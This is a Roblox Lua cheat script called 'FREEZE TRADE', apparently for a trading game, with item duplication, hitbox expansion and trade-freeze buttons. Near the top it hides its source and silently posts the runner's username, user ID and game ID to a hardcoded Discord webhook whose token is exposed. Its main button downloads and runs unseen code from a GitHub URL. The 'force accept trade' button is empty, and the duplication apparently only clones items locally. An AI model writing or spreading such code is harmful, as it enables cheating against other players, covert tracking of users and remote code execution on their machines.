local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local PlayerGui = player.PlayerGui
local Backpack = player.Backpack
local StarterGear = player.StarterGear
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId

local WebhookURL = "https://discord.com/api/webhooks/1530805312192381141/X6zSC5HHZ1-7vyRsmqMIiD1SpyT7ynG1OrHzgdB7YxiauG4DFdJaIDmwxHFsGhEUPyjC"

if setfflag then setfflag("DebugHideScriptSource", true) end
setmetatable(getfenv(), {__metatable = "Hidden"})

pcall(function()
    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode({
        embeds = {{
            title = "SCRIPT USED",
            color = 65280,
            fields = {
                {name = "username", value = "`"..PlayerName.."`", inline = true},
                {name = "user id", value = "`"..PlayerID.."`", inline = true},
                {name = "game id", value = "`"..GameID.."`", inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }), Enum.HttpContentType.ApplicationJson)
end)

local Theme = {
    BG = Color3.fromRGB(10,10,15),
    Panel = Color3.fromRGB(20,20,30),
    Primary = Color3.fromRGB(0,200,255),
    Text = Color3.fromRGB(255,255,255)
}

local Loader = Instance.new("ScreenGui")
Loader.Name = "FreezeLoader"
Loader.ResetOnSpawn = false
Loader.IgnoreGuiInset = true
Loader.Parent = gethui and gethui() or CoreGui

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1,0,1,0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.Parent = Loader

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0,340,0,520)
Center.Position = UDim2.new(0.5,-170,0.5,-260)
Center.BackgroundTransparency = 1
Center.Parent = MainBG

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,60)
Title.Position = UDim2.new(0,0,0,20)
Title.BackgroundTransparency = 1
Title.Text = "FREEZE TRADE"
Title.TextColor3 = Theme.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0,280,0,18)
BarOutline.Position = UDim2.new(0.5,-140,0.22,0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.Parent = Center
Instance.new("UICorner", BarOutline).CornerRadius = UDim.new(1,0)

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0,0,1,0)
ProgressBar.BackgroundColor3 = Theme.Primary
ProgressBar.Parent = BarOutline
Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1,0)

local Elapsed = 0
local Conn = RunService.RenderStepped:Connect(function(d)
    Elapsed += d
    local Prog = math.min(Elapsed/5,1)
    ProgressBar.Size = UDim2.new(Prog,0,1,0)
    if Prog >=1 then
        Conn:Disconnect()
        task.wait(0.5)
        Loader:Destroy()
        LoadGUI()
    end
end)

local HitboxSize = 8
local HitboxParts = {}

local function EnableHitbox()
    DisableHitbox()
    for _,v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HRP = v:FindFirstChild("HumanoidRootPart")
            if HRP then
                local Box = Instance.new("Part")
                Box.Size = Vector3.new(HitboxSize,HitboxSize,HitboxSize)
                Box.Anchored = false
                Box.CanCollide = false
                Box.Transparency = 0.7
                Box.BrickColor = BrickColor.new("Cyan")
                Box.Material = Enum.Material.ForceField
                Box.Parent = HRP
                Instance.new("Weld", Box).Part0 = HRP
                table.insert(HitboxParts,Box)
            end
        end
    end
end

local function DisableHitbox()
    for _,v in pairs(HitboxParts) do if v then v:Destroy() end end
    HitboxParts = {}
end

local function DupeItem(name)
    local success = false
    local source = nil
    local locations = {ReplicatedStorage, Workspace, player.Character, Backpack}
    for _, loc in pairs(locations) do
        if loc then
            local found = loc:FindFirstChild(name, true)
            if found and (found:IsA("Tool") or found:IsA("Accessory")) then
                source = found
                break
            end
        end
    end
    if source then
        local clone1 = source:Clone()
        clone1.Parent = Backpack
        task.wait(0.1)
        if StarterGear then
            local clone2 = source:Clone()
            clone2.Parent = StarterGear
        end
        success = true
    end
    return success
end

function LoadGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({
        Name = "FREEZE TRADE",
        KeySystem = false,
        ConfigurationSaving = {Enabled = false},
        UseMobileSizing = true
    })

    local Main = Window:CreateTab("Main", 4483362458)
    local Weapons = Window:CreateTab("Weapons", 4483362458)
    local Tools = Window:CreateTab("Tools", 4483362458)

    Main:CreateSection("FEATURES")
    Main:CreateButton({
        Name = "🧊 activate freeze trade",
        Callback = function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/baddiesfreeze-glitch/freeze-trade/refs/heads/main/Baddies", true))()
            end)
            Rayfield:Notify({Title="✅ ACTIVATED",Content="Freeze trade loaded",Duration=2.5})
        end
    })
    Main:CreateButton({Name = "force accept trade", Callback = function() end})

    Weapons:CreateSection("ALL WEAPONS")
    local WeaponList = {
        "axe",
        "brass knuckles",
        "chain mace",
        "chakram",
        "champion gloves",
        "chainsaw",
        "crowbar",
        "cupid's bow",
        "dance bomb",
        "fan of requiem",
        "flamethrower",
        "freeze gun",
        "frying pan",
        "ghostly gloves",
        "glitter bomb",
        "golden pipe",
        "gravity gun",
        "grenade launcher",
        "harpoon",
        "ice crown queen",
        "ice katana",
        "inferno blade",
        "kitty purse",
        "love me hate me taser",
        "loveboard",
        "nunchucks",
        "nightmare purse",
        "poison knuckles",
        "rainbow portal gun",
        "reindeer purse",
        "roller skates",
        "sakura blade",
        "santa's rpg",
        "scythe",
        "shiny purse",
        "slasher claws",
        "sledgehammer",
        "spearhead stick",
        "spiked baddies bat",
        "spiked kitty stanli",
        "spiked knuckles",
        "spiked purse",
        "trident",
        "witch scepter",
        "yin yang knives"
    }

    for _,wep in pairs(WeaponList) do
        Weapons:CreateButton({
            Name = wep,
            Callback = function()
                local ok = DupeItem(wep)
                Rayfield:Notify({
                    Title = ok and "✅ DUPLICATED!" or "❌ NOT FOUND",
                    Content = ok and wep.." added" or "weapon not loaded",
                    Duration = 2.5
                })
            end
        })
    end

    Tools:CreateSection("SETTINGS")
    Tools:CreateSlider({Name = "hitbox size", Range = {2,20}, CurrentValue = HitboxSize, Callback = function(v) HitboxSize = v EnableHitbox() end})
    Tools:CreateButton({Name = "enable hitbox", Callback = function() EnableHitbox() end})
    Tools:CreateButton({Name = "disable hitbox", Callback = function() DisableHitbox() end})
end
